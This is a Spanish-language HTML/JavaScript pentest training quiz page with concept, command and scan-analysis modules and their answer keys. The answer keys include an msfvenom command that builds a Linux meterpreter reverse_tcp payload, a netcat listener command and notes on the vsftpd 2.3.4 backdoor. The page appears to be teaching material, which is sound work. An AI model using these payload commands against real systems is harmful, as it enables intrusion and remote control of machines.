<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Pentest Training Hub - Docente NMZ</title>
    <style>
        :root {
            --neon: #00ff41;
            --dark: #050505;
            --panel: #111;
            --dim-green: #003b00;
            --danger: #ff3131;
            --blue: #00d2ff;
        }

        * { box-sizing: border-box; margin: 0; padding: 0; }
        body { 
            background-color: var(--dark); 
            color: var(--neon); 
            font-family: 'Courier New', Courier, monospace; 
            min-height: 100-vh;
            display: flex; flex-direction: column; align-items: center;
        }

        /* MARCA DE AGUA */
        body::after {
            content: "Docente NMZ - Pentest v2.0 - 2026";
            position: fixed; bottom: 10px; right: 20px; font-size: 10px; opacity: 0.3;
        }

        #app { width: 100%; max-width: 900px; padding: 40px 20px; }

        /* VISTA: MENÚ PRINCIPAL */
        .hub-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 20px; margin-top: 30px;
        }

        .hub-card {
            background: var(--panel);
            border: 1px solid var(--dim-green);
            padding: 30px; border-radius: 8px;
            cursor: pointer; transition: 0.3s;
            text-align: center;
        }

        .hub-card:hover { border-color: var(--neon); box-shadow: 0 0 15px rgba(0,255,65,0.2); transform: translateY(-5px); }
        .hub-card h3 { margin-bottom: 15px; color: #fff; text-transform: uppercase; }
        .hub-card p { font-size: 13px; color: var(--neon); opacity: 0.7; }

        /* TERMINAL / INTERFAZ DE JUEGO */
        .terminal {
            border: 1px solid var(--neon); background: var(--panel);
            border-radius: 5px; overflow: hidden;
        }
        .term-header { background: #222; padding: 10px 15px; display: flex; justify-content: space-between; font-size: 12px; }
        .term-body { padding: 30px; }

        .output-box { 
            background: #000; padding: 15px; border: 1px solid #222; 
            margin: 15px 0; font-size: 13px; color: #ccc; white-space: pre-wrap;
        }

        input {
            background: transparent; border: none; border-bottom: 1px solid var(--neon);
            color: var(--neon); width: 100%; font-size: 18px; padding: 10px 0; outline: none; margin: 15px 0;
        }

        .btn {
            background: transparent; border: 1px solid var(--neon); color: var(--neon);
            padding: 12px 25px; cursor: pointer; font-weight: bold; font-family: inherit;
        }
        .btn:hover { background: var(--neon); color: #000; }
        .btn-back { border-color: #666; color: #666; margin-bottom: 20px; display: inline-block; text-decoration: none; font-size: 12px; }

        .feedback { margin-top: 20px; padding: 15px; border-radius: 5px; display: none; border: 1px dashed; }
        .success { border-color: var(--neon); color: #fff; }
        .error { border-color: var(--danger); color: var(--danger); }
    </style>
</head>
<body>

<div id="app">
    </div>

<script>
    // --- BASES DE DATOS ---
    const DB = {
        conceptos: [
            { q: "En la metodología de Pentesting, ¿qué diferencia a un escaneo 'Silent' (Sigiloso) de uno normal?", a: "sigilo", e: "El sigilo (como el SYN scan -sS) no completa el handshake TCP, evitando que muchos firewalls registren el intento de conexión." },
            { q: "¿Qué fase sigue inmediatamente después de la Explotación exitosa?", a: "post-explotación", e: "La post-explotación incluye persistencia, escalada de privilegios y recolección de datos." }
        ],
        comandos: [
            { q: "ESCENARIO: Genera un payload para Linux x64 en formato ELF con IP 10.0.2.15 puerto 4444.", a: "msfvenom -p linux/x64/meterpreter/reverse_tcp lhost=10.0.2.15 lport=4444 -f elf", e: "Msfvenom es la herramienta estándar para generar payloads maliciosos." },
            { q: "ESCENARIO: Pon un listener de Netcat en modo escucha, puerto 4444, sin resolución DNS.", a: "nc -lvnp 4444", e: "l:listen, v:verbose, n:no dns, p:port." }
        ],
        analisis: [
            { 
                q: "ANALIZA EL OUTPUT DE NMAP:\nPORT   STATE SERVICE VERSION\n21/tcp open  ftp     vsftpd 2.3.4\n\n¿Por qué este servicio es una prioridad crítica?", 
                a: "backdoor", 
                e: "La versión 2.3.4 de vsftpd contiene un backdoor famoso que permite acceso root inmediato mediante el envío de un ':)' en el nombre de usuario." 
            },
            {
                q: "ANALIZA EL OUTPUT DE NIKTO:\n+ /phpMyAdmin/: phpMyAdmin directory found\n+ OSVDB-3092: /cgi-bin/test.cgi: Arbitrary shell execution.\n\n¿Cuál es el hallazgo de mayor impacto?",
                a: "test.cgi",
                e: "La ejecución de shell arbitraria en /cgi-bin/ permite un RCE (Remote Code Execution) directo."
            }
        ]
    };

    // --- MOTOR DEL HUB ---
    let currentModule = null;
    let currentIndex = 0;

    function switchView(view) {
        const app = document.getElementById('app');
        
        if (view === 'menu') {
            app.innerHTML = `
                <h1 style="text-align:center; font-size: 24px;">PENTEST TRAINING HUB</h1>
                <p style="text-align:center; color:#555; font-size:12px;">Security Dashboard | Kali Environment</p>
                
                <div class="hub-grid">
                    <div class="hub-card" onclick="startModule('conceptos')">
                        <h3>MODO ACADEMIA</h3>
                        <p>Estrategia, fases y teoría de ataque.</p>
                    </div>
                    <div class="hub-card" onclick="startModule('comandos')">
                        <h3>MODO TERMINAL</h3>
                        <p>Precisión técnica y sintaxis pura.</p>
                    </div>
                    <div class="hub-card" onclick="startModule('analisis')">
                        <h3>MODO FORENSE</h3>
                        <p>Detección de vulns en logs y escaneos.</p>
                    </div>
                </div>
            `;
        } else {
            renderGame();
        }
    }

    function startModule(mod) {
        currentModule = mod;
        currentIndex = 0;
        switchView('game');
    }

    function renderGame() {
        const app = document.getElementById('app');
        const data = DB[currentModule][currentIndex];

        app.innerHTML = `
            <a href="#" class="btn-back" onclick="switchView('menu')"><< VOLVER AL HUB</a>
            <div class="terminal">
                <div class="term-header">
                    <span>${currentModule.toUpperCase()} ENGINE</span>
                    <span>MODO: PENTEST_AUDIT</span>
                </div>
                <div class="term-body">
                    <div class="output-box">${data.q}</div>
                    <div style="font-size: 14px;">root@kali:~#</div>
                    <input type="text" id="userInput" autofocus autocomplete="off" spellcheck="false">
                    <div id="fb" class="feedback"></div>
                    <div id="actions" style="margin-top:20px;">
                        <button class="btn" onclick="check()">EJECUTAR</button>
                    </div>
                </div>
            </div>
        `;

        const input = document.getElementById('userInput');
        input.onkeypress = (e) => { if(e.key === 'Enter') check(); };
        input.focus();
    }

    function check() {
        const input = document.getElementById('userInput');
        const val = input.value.toLowerCase();
        const data = DB[currentModule][currentIndex];
        const fb = document.getElementById('fb');
        
        const isOk = val.includes(data.a.toLowerCase());
        
        fb.style.display = "block";
        input.disabled = true;

        if(isOk) {
            fb.className = "feedback success";
            fb.innerHTML = `[+] ACCESO CONCEDIDO.<br><span style="font-size:12px; color:#aaa;">${data.e}</span>`;
        } else {
            fb.className = "feedback error";
            fb.innerHTML = `[-] ACCESO DENEGADO.<br><span style="font-size:12px; color:#aaa;">${data.e}</span><br><br>SINTAXIS ESPERADA: ${data.a}`;
        }

        document.getElementById('actions').innerHTML = `
            <button class="btn" onclick="next()">CONTINUAR >></button>
        `;
    }

    function next() {
        currentIndex++;
        if (currentIndex < DB[currentModule].length) {
            renderGame();
        } else {
            document.getElementById('app').innerHTML = `
                <div style="text-align:center;">
                    <h2>MÓDULO FINALIZADO</h2>
                    <p style="margin:20px 0;">Has completado el entrenamiento de ${currentModule.toUpperCase()}.</p>
                    <button class="btn" onclick="switchView('menu')">REGRESAR AL HUB</button>
                </div>
            `;
        }
    }

    // Iniciar
    switchView('menu');
</script>
</body>
</html>
